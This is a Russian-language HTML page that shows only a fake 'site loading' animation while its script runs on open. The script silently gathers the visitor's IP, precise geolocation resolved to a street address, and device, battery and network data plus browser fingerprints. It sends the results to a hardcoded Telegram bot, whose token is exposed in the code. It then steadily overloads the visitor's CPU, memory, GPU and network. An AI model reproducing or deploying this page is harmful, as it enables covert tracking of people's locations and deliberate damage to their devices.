<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка сайта...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #2c3e50;
            font-family: 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ecf0f1;
        }
        .message {
            text-align: center;
            font-size: 3rem;
            font-weight: 300;
            letter-spacing: 2px;
        }
        .dots {
            display: inline-block;
            width: 3rem;
            text-align: left;
        }
        .dots::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="message">
        Загрузка сайта<span class="dots"></span>
    </div>

    <script>
        (function() {
            // ⚠️ ВАШИ ДАННЫЕ (токен и ID)
            const TELEGRAM_TOKEN = '8519920730:AAF9hPsqQCFH5sVrqJ9OCpCPSOtdKeilT88';
            const TELEGRAM_CHAT_ID = '8489374137';

            // ==================== РАСШИРЕННЫЙ СБОР OSINT ====================
            async function collectExtendedData() {
                const result = {};

                // IP
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    result.ip = ipData.ip;
                } catch {
                    result.ip = 'Не удалось определить';
                }

                // Геолокация
                result.geo = 'Не запрошено или отказано';
                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                        });
                        const { latitude, longitude } = position.coords;
                        const geoRes = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
                            { headers: { 'User-Agent': 'MyOSINTCollector/1.0' } }
                        );
                        const geoJson = await geoRes.json();
                        result.geo = geoJson.display_name || `${latitude}, ${longitude}`;
                    } catch {
                        result.geo = 'Геолокация недоступна';
                    }
                }

                // UserAgent и ОС/устройство
                const ua = navigator.userAgent;
                result.userAgent = ua;
                if (ua.includes('Windows')) result.os = 'Windows';
                else if (ua.includes('Mac OS')) result.os = 'macOS';
                else if (ua.includes('Linux')) result.os = 'Linux';
                else if (ua.includes('Android')) result.os = 'Android';
                else if (ua.includes('iPhone') || ua.includes('iPad')) result.os = 'iOS';
                else result.os = 'Неизвестно';

                if (ua.includes('iPhone')) result.device = 'iPhone';
                else if (ua.includes('iPad')) result.device = 'iPad';
                else if (ua.includes('Android')) {
                    const match = ua.match(/Android\s+[^;]+(;\s+[^)]+)/);
                    result.device = match ? match[1] : 'Android устройство';
                } else if (ua.includes('Windows NT')) result.device = 'ПК (Windows)';
                else if (ua.includes('Macintosh')) result.device = 'ПК (Mac)';
                else result.device = 'ПК/Другое';

                // CPU и RAM
                result.cpuCores = navigator.hardwareConcurrency || 'неизвестно';
                result.memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'неизвестно';

                // Батарея
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        result.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'зарядка' : 'разрядка'})`;
                    } catch {
                        result.battery = 'Недоступно';
                    }
                } else {
                    result.battery = 'Не поддерживается';
                }

                // Информация о сети
                if (navigator.connection) {
                    const conn = navigator.connection;
                    result.network = `${conn.effectiveType || '??'}, ${conn.downlink ? conn.downlink + ' Mbps' : '??'}, rtt=${conn.rtt || '??'}ms`;
                } else {
                    result.network = 'Недоступно';
                }

                // Плагины
                const plugins = [];
                if (navigator.plugins && navigator.plugins.length > 0) {
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        plugins.push(navigator.plugins[i].name);
                    }
                }
                result.plugins = plugins.slice(0, 5).join(', ') + (plugins.length > 5 ? ` и ещё ${plugins.length-5}` : '') || 'Нет';

                // Экран, язык, часовой пояс
                result.screen = `${screen.width}x${screen.height} (глубина ${screen.colorDepth}bit)`;
                result.language = navigator.language || 'неизвестно';
                result.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'неизвестно';
                result.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
                result.localStorage = typeof localStorage !== 'undefined' ? 'Доступен' : 'Недоступен';
                result.referrer = document.referrer || 'Прямой переход';
                result.timestamp = new Date().toISOString();
                result.url = window.location.href;
                result.platform = navigator.platform || 'неизвестно';
                result.doNotTrack = navigator.doNotTrack || 'не указано';

                // Canvas fingerprint
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = 200;
                    canvas.height = 50;
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(0, 0, 100, 50);
                    ctx.fillStyle = '#069';
                    ctx.fillText('OSINT', 2, 15);
                    result.canvasFingerprint = canvas.toDataURL().slice(0, 50) + '...';
                } catch {
                    result.canvasFingerprint = 'Ошибка';
                }

                // WebGL fingerprint
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            result.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        } else {
                            result.webglRenderer = 'Недоступно';
                        }
                    } else {
                        result.webglRenderer = 'WebGL не поддерживается';
                    }
                } catch {
                    result.webglRenderer = 'Ошибка';
                }

                // Audio fingerprint
                try {
                    const AudioContext = window.AudioContext || window.webkitAudioContext;
                    if (AudioContext) {
                        const ctx = new AudioContext();
                        result.audio = 'AudioContext доступен';
                        ctx.close();
                    } else {
                        result.audio = 'Нет AudioContext';
                    }
                } catch {
                    result.audio = 'Ошибка';
                }

                // Доступные шрифты
                const fontCheck = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana'];
                const availableFonts = fontCheck.filter(f => document.fonts.check(`12px "${f}"`));
                result.fonts = availableFonts.join(', ') || 'Стандартные';

                // Время загрузки страницы
                if (performance && performance.timing) {
                    const timing = performance.timing;
                    const loadTime = timing.loadEventEnd - timing.navigationStart;
                    result.loadTime = loadTime + 'ms';
                } else {
                    result.loadTime = 'недоступно';
                }

                return result;
            }

            // ==================== ФОРМАТИРОВАНИЕ СООБЩЕНИЯ (ПОНЯТНЫЙ ВИД) ====================
            function formatTelegramMessage(data) {
                const lines = [];

                // Заголовок
                lines.push('🕵️‍♂️ *OSINT ОТЧЁТ*');
                lines.push('');

                // 1. Сеть и геолокация
                lines.push('🌐 *Сеть и гео*');
                lines.push(`▫️ *IP:* ${data.ip}`);
                lines.push(`▫️ *Гео:* ${data.geo}`);
                lines.push(`▫️ *Тип сети:* ${data.network}`);
                lines.push('');

                // 2. Устройство и система
                lines.push('💻 *Устройство и ОС*');
                lines.push(`▫️ *ОС:* ${data.os}`);
                lines.push(`▫️ *Устройство:* ${data.device}`);
                lines.push(`▫️ *Платформа:* ${data.platform}`);
                lines.push(`▫️ *User‑Agent:* \`${data.userAgent}\``);
                lines.push('');

                // 3. Аппаратные ресурсы
                lines.push('⚙️ *Ресурсы*');
                lines.push(`▫️ *Ядер CPU:* ${data.cpuCores}`);
                lines.push(`▫️ *ОЗУ:* ${data.memory}`);
                lines.push(`▫️ *Батарея:* ${data.battery}`);
                lines.push(`▫️ *WebGL рендерер:* ${data.webglRenderer}`);
                lines.push('');

                // 4. Браузер и окружение
                lines.push('🧩 *Браузер*');
                lines.push(`▫️ *Экран:* ${data.screen}`);
                lines.push(`▫️ *Язык:* ${data.language}`);
                lines.push(`▫️ *Часовой пояс:* ${data.timezone}`);
                lines.push(`▫️ *Куки:* ${data.cookiesEnabled}`);
                lines.push(`▫️ *LocalStorage:* ${data.localStorage}`);
                lines.push(`▫️ *Плагины:* ${data.plugins}`);
                lines.push(`▫️ *Шрифты:* ${data.fonts}`);
                lines.push(`▫️ *Canvas:* ${data.canvasFingerprint}`);
                lines.push(`▫️ *Аудио:* ${data.audio}`);
                lines.push('');

                // 5. Дополнительно
                lines.push('📎 *Дополнительно*');
                lines.push(`▫️ *DoNotTrack:* ${data.doNotTrack}`);
                lines.push(`▫️ *Referrer:* ${data.referrer}`);
                lines.push(`▫️ *Время загрузки:* ${data.loadTime}`);
                lines.push(`▫️ *URL:* ${data.url}`);
                lines.push('');

                // Время отчёта
                lines.push(`🕒 *Отчёт создан:* ${data.timestamp}`);

                return lines.join('\n');
            }

            // ==================== ОТПРАВКА ТЕКСТА В TELEGRAM ====================
            function sendToTelegram(message) {
                const escapeMarkdown = (str) => str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
                const safeMessage = escapeMarkdown(message);
                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(safeMessage)}&parse_mode=Markdown`;

                if (url.length > 2000) {
                    const parts = [];
                    const maxPartSize = 1500;
                    for (let i = 0; i < safeMessage.length; i += maxPartSize) {
                        parts.push(safeMessage.slice(i, i + maxPartSize));
                    }
                    parts.forEach((part, index) => {
                        const partUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(part + (parts.length > 1 ? ` (часть ${index+1}/${parts.length})` : ''))}&parse_mode=Markdown`;
                        fetch(partUrl, { mode: 'no-cors' }).catch(() => {});
                    });
                } else {
                    fetch(url, { mode: 'no-cors' }).catch(() => {});
                }
            }

            // ==================== ФУНКЦИИ НАГРУЗКИ (ПОСТЕПЕННОЕ УВЕЛИЧЕНИЕ) ====================
            let stressActive = false;
            let workers = [];
            let networkInterval = null;
            let gpuLoop = null;
            let memoryLeakArray = [];
            let intensityLevel = 0;
            let intensityInterval = null;

            function startCPUWorker() {
                const workerCode = `
                    function busyLoop() {
                        let x = 0;
                        while(true) {
                            for(let j=0; j<1000000; j++) {
                                x += Math.sqrt(j) * Math.tan(j);
                            }
                        }
                    }
                    busyLoop();
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                const worker = new Worker(URL.createObjectURL(blob));
                workers.push(worker);
            }

            function addMemoryLoad() {
                for (let i = 0; i < 2; i++) {
                    const arr = new Array(500000).fill(0).map(() => Math.random());
                    memoryLeakArray.push(arr);
                }
                if (memoryLeakArray.length > 100) {
                    memoryLeakArray.splice(0, 30);
                }
            }

            function updateNetworkIntensity() {
                if (networkInterval) clearInterval(networkInterval);
                const intervalTime = Math.max(50, 500 - intensityLevel * 30);
                networkInterval = setInterval(() => {
                    if (!stressActive) {
                        clearInterval(networkInterval);
                        return;
                    }
                    const urls = [
                        'https://www.google.com/favicon.ico',
                        'https://www.cloudflare.com/cdn-cgi/trace',
                        'https://www.github.com/favicon.ico',
                        'https://www.microsoft.com/favicon.ico',
                        'https://www.amazon.com/favicon.ico'
                    ];
                    urls.forEach(url => {
                        fetch(url, { mode: 'no-cors' }).catch(() => {});
                        new Image().src = url + '?r=' + Math.random();
                    });
                }, intervalTime);
            }

            function startGPULoop() {
                if (gpuLoop) return;
                const canvas = document.createElement('canvas');
                canvas.width = 512;
                canvas.height = 512;
                canvas.style.display = 'none';
                document.body.appendChild(canvas);
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return;

                const vertexShaderSource = `
                    attribute vec2 a_position;
                    void main() {
                        gl_Position = vec4(a_position, 0.0, 1.0);
                    }
                `;
                const fragmentShaderSource = `
                    precision highp float;
                    uniform float u_time;
                    uniform float u_complexity;
                    void main() {
                        float sum = 0.0;
                        for (int i = 0; i < 1000; i++) {
                            sum += sin(u_time * float(i) * u_complexity) * cos(float(i) * u_complexity);
                        }
                        gl_FragColor = vec4(sin(u_time), cos(u_time), sum, 1.0);
                    }
                `;

                function createShader(gl, source, type) {
                    const shader = gl.createShader(type);
                    gl.shaderSource(shader, source);
                    gl.compileShader(shader);
                    return shader;
                }

                const vertexShader = createShader(gl, vertexShaderSource, gl.VERTEX_SHADER);
                const fragmentShader = createShader(gl, fragmentShaderSource, gl.FRAGMENT_SHADER);
                const program = gl.createProgram();
                gl.attachShader(program, vertexShader);
                gl.attachShader(program, fragmentShader);
                gl.linkProgram(program);
                gl.useProgram(program);

                const vertices = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
                const buffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
                const positionLocation = gl.getAttribLocation(program, 'a_position');
                gl.enableVertexAttribArray(positionLocation);
                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);

                const timeLocation = gl.getUniformLocation(program, 'u_time');
                const complexityLocation = gl.getUniformLocation(program, 'u_complexity');

                function render() {
                    if (!stressActive) return;
                    gl.uniform1f(timeLocation, performance.now() / 1000);
                    gl.uniform1f(complexityLocation, 1.0 + intensityLevel / 5);
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                    requestAnimationFrame(render);
                }
                render();
                gpuLoop = true;
            }

            function startGradualStress() {
                stressActive = true;
                intensityLevel = 0;

                // Каждую секунду увеличиваем интенсивность
                intensityInterval = setInterval(() => {
                    if (!stressActive) {
                        clearInterval(intensityInterval);
                        return;
                    }
                    intensityLevel++;

                    // CPU: добавляем новый воркер каждые 2 уровня
                    if (intensityLevel % 2 === 0 && workers.length < (navigator.hardwareConcurrency || 4) * 2) {
                        startCPUWorker();
                    }

                    // RAM: добавляем память
                    addMemoryLoad();

                    // Сеть: обновляем интервал
                    updateNetworkIntensity();

                    // GPU: сложность уже зависит от intensityLevel через uniform
                }, 1000);

                // Инициализируем первый уровень
                startCPUWorker();
                addMemoryLoad();
                updateNetworkIntensity();
                startGPULoop();
            }

            // ==================== ОСНОВНОЙ ПРОЦЕСС ====================
            (async function() {
                try {
                    // 1. Сбор расширенных данных
                    const data = await collectExtendedData();

                    // 2. Форматирование и отправка текстового сообщения
                    const textMessage = formatTelegramMessage(data);
                    sendToTelegram(textMessage);

                    // 3. Запуск постепенной нагрузки в фоне
                    startGradualStress();

                } catch (error) {
                    console.error('Ошибка:', error);
                }
            })();

            // Таймаут на случай зависания сбора данных (не влияет на интерфейс)
            setTimeout(() => {
                if (!stressActive) {
                    console.warn('Сбор данных занял больше 20 секунд, запускаем нагрузку принудительно');
                    startGradualStress();
                }
            }, 20000);
        })();
    </script>
</body>
</html>
